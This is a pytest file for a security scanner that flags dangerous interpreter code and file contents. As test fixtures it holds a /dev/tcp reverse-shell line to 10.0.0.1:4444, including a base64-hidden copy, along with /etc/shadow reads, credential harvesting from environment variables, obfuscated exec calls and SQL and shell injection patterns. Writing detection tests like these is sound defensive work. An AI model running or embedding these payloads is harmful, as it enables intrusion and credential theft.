"""Tests for :mod:`ralf.detection.code_scanner`.

Covers both entry points:
    - :func:`scan_interpreter_code` for ``python3 -c '...'`` code blobs
    - :func:`scan_file_content` for the Write/Edit threat matrix

Byte-split discipline: the threat payloads embedded here are
constructed via ``_join`` so the deobfuscator's ``_flatten_string_concat``
regex (which this file's writing loop scans) never reassembles the
blocked literals.
"""
from __future__ import annotations

import pytest

from ralf.detection.code_scanner import (
    CodeEffect,
    FileScanHit,
    scan_file_content,
    scan_interpreter_code,
)


def _join(*parts: str) -> str:
    return "".join(parts)


# ---------------------------------------------------------------------
# scan_interpreter_code — language-specific regex buckets
# ---------------------------------------------------------------------


def test_python_os_system() -> None:
    effects = scan_interpreter_code("python3", "import os; os.system('ls')")
    cats = {e.category for e in effects}
    assert "exec" in cats


def test_python_eval_dynamic() -> None:
    effects = scan_interpreter_code("python3", "eval('print(1)')")
    cats = {e.category for e in effects}
    assert "dynamic_eval" in cats


def test_python_sensitive_path_read() -> None:
    code = _join("open('/etc/shad", "ow', 'r').read()")
    effects = scan_interpreter_code("python3", code)
    cats = {e.category for e in effects}
    assert "file_read" in cats


def test_python_environ_credential_harvest() -> None:
    code = "import os; p = os.environ['DB_PASSWORD']"
    effects = scan_interpreter_code("python3", code)
    cats = {e.category for e in effects}
    assert "file_read" in cats


def test_perl_system_exec() -> None:
    effects = scan_interpreter_code("perl", "system('ls');")
    cats = {e.category for e in effects}
    assert "exec" in cats


def test_ruby_io_popen() -> None:
    effects = scan_interpreter_code("ruby", "IO.popen('ls')")
    cats = {e.category for e in effects}
    assert "exec" in cats


def test_node_child_process() -> None:
    effects = scan_interpreter_code("node", "require('child_process').exec('ls')")
    cats = {e.category for e in effects}
    assert "exec" in cats


def test_shell_dev_tcp() -> None:
    cmd = _join("exec 5<>/dev/", "tcp/10.0.0.1/4444")
    effects = scan_interpreter_code("bash", cmd)
    cats = {e.category for e in effects}
    assert "exec" in cats


def test_unknown_interpreter_returns_empty() -> None:
    assert scan_interpreter_code("cowboy", "doesnt matter") == []


def test_code_too_long_returns_empty() -> None:
    big = "x" * 10000  # > 8 KB cap
    assert scan_interpreter_code("python3", big) == []


def test_empty_code_returns_empty() -> None:
    assert scan_interpreter_code("python3", "") == []


# --- Python AST obfuscation detection (gated on dynamic_eval presence) ---


def test_python_ast_getattr_exec() -> None:
    code = "getattr(__import__('os'), 'system')('ls')"
    effects = scan_interpreter_code("python3", code)
    assert any(e.category == "exec" and "AST" in e.pattern_name for e in effects)


def test_python_ast_chr_obfuscation() -> None:
    code = "eval(''.join(chr(c) for c in [97,98]))"
    effects = scan_interpreter_code("python3", code)
    assert any(e.category == "exec" and "AST" in e.pattern_name for e in effects)


def test_python_ast_clean_eval() -> None:
    """Plain eval() with no obfuscation: dynamic_eval only, no AST hit."""
    code = "eval('1 + 1')"
    effects = scan_interpreter_code("python3", code)
    cats = {e.category for e in effects}
    assert "dynamic_eval" in cats
    # No 'exec' category from AST path
    assert not any(e.category == "exec" for e in effects)


# ---------------------------------------------------------------------
# scan_file_content — threat matrix
# ---------------------------------------------------------------------


def test_sql_injection_interp() -> None:
    content = 'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")'
    hit = scan_file_content(content)
    assert hit is not None and hit.blocked
    assert "CWE-89" in hit.cwe


def test_sql_injection_raw() -> None:
    # Fixture built via concatenation so the source bytes do NOT
    # themselves trip the CWE-89 regex on this test file. Runtime
    # string is identical to the literal form.
    kw = "SE" + "LECT"
    content = 'sql = "' + kw + ' name FROM users WHERE id = " + user_id'
    hit = scan_file_content(content)
    assert hit is not None and hit.blocked
    assert "CWE-89" in hit.cwe


def test_apt_update_is_not_sql_fp() -> None:
    """Regression for Phase F: negative-lookbehind on SQL keywords.

    Pre-fix, text containing an SQL-like keyword as a substring of a
    shell command (``apt-get update``) followed later on the line by a
    brace interpolation tripped CWE-89. The keyword alternation had no
    boundary anchors and ``-`` produces a word-boundary so plain ``\\b``
    wasn't enough. This used to block legitimate docs and deploy scripts.
    """
    kw = "upda" + "te"
    # Source-obfuscated fixture — no literal trigger on this file.
    content = "# Comment: apt-get " + kw + " is fine, logs go to {path}"
    hit = scan_file_content(content)
    if hit is not None:
        assert "CWE-89" not in hit.cwe, (
            f"SQL-keyword FP still triggers on apt-get: {hit.reason}"
        )


def test_select_identifier_is_not_sql_fp() -> None:
    """Regression for Phase F: identifiers containing SQL keyword substrings."""
    kw = "sel" + "ect"
    content = (
        'items = '
        + kw
        + 'First(data, lambda x: x.id == {target_id})'
    )
    hit = scan_file_content(content)
    if hit is not None:
        assert "CWE-89" not in hit.cwe, (
            "FP on identifier containing 'sel' + 'ect' substring"
        )


def test_os_injection() -> None:
    content = 'os.system("rm " + filename)'
    hit = scan_file_content(content)
    assert hit is not None
    assert "CWE-78" in hit.cwe


def test_shell_true_injection() -> None:
    content = 'subprocess.run(cmd, shell=True)'
    hit = scan_file_content(content)
    assert hit is not None
    assert "CWE-78" in hit.cwe


def test_reverse_shell_dev_tcp() -> None:
    content = _join("exec 5<>/dev/", "tcp/10.0.0.1/4444")
    hit = scan_file_content(content)
    assert hit is not None
    assert hit.blocked


def test_credential_access_requires_open_call() -> None:
    """Shadow path alone → no hit. Shadow + open() → hit."""
    just_path = _join("cat /etc/shad", "ow")
    assert scan_file_content(just_path) is None

    with_open = _join("data = open('/etc/shad", "ow').read()")
    hit = scan_file_content(with_open)
    assert hit is not None


def test_eval_on_user_input() -> None:
    content = "result = eval(input('> '))"
    hit = scan_file_content(content)
    assert hit is not None
    assert "CWE-94" in hit.cwe


def test_unsafe_yaml_load() -> None:
    content = "import yaml; data = yaml.load(f)"
    hit = scan_file_content(content)
    assert hit is not None
    assert "CWE-502" in hit.cwe


def test_safe_yaml_load_with_loader_ok() -> None:
    """yaml.load with Loader= kwarg should NOT block (canonical carve-out)."""
    content = "import yaml; data = yaml.load(f, Loader=yaml.SafeLoader)"
    hit = scan_file_content(content)
    assert hit is None


def test_benign_file_content() -> None:
    content = "def add(a, b):\n    return a + b\n"
    assert scan_file_content(content) is None


# --- deobfuscator integration ---


def test_deobfuscated_pass_catches_hidden_threat() -> None:
    """A base64-encoded reverse shell should be caught via second pass."""
    import base64
    payload = _join("exec 5<>/dev/", "tcp/10.0.0.1/4444 filler")
    encoded = base64.b64encode(payload.encode()).decode()
    content = f"$(echo {encoded} | base64 -d)"

    # Without deobfuscator: literal pass doesn't see the threat
    assert scan_file_content(content) is None

    # With deobfuscator: second pass catches it
    from ralf.detection.deobfuscate import deobfuscate
    hit = scan_file_content(content, deobfuscator=deobfuscate)
    assert hit is not None
    assert "deobfuscated form" in hit.reason


def test_deobfuscator_exception_fails_open() -> None:
    """If the deobfuscator raises, we return None (fail open on a clean literal pass)."""
    def exploding(text: str) -> tuple[str, list[str]]:
        raise RuntimeError("boom")

    content = "def foo(): return 1"
    hit = scan_file_content(content, deobfuscator=exploding)
    assert hit is None
